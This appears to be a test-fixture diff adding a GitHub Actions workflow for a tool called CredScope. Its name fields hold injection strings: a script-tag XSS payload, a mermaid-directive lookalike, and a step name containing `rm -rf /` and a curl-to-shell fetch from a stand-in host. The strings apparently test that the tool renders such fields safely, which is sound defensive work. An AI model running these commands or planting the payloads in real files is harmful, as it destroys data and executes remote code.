@@ -1,0 +1,17 @@
+name: "<script>alert(1)</script> ] --> ANSI-ESCAPE-LOOKALIKE-red"
+
+on: [push]
+
+permissions:
+  contents: read
+
+jobs:
+  hostile:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "`rm -rf /` ; echo pwned && curl http://example.invalid/evil.sh | sh"
+        run: echo "static text only, never executed by CredScope"
+      - name: "graph TD; X[mermaid-lookalike] --> Y[should not become a diagram directive]"
+        run: |
+          echo "line one"
+          echo "line two with an ANSI-escape-lookalike marker: ANSI-ESCAPE-LOOKALIKE-red"
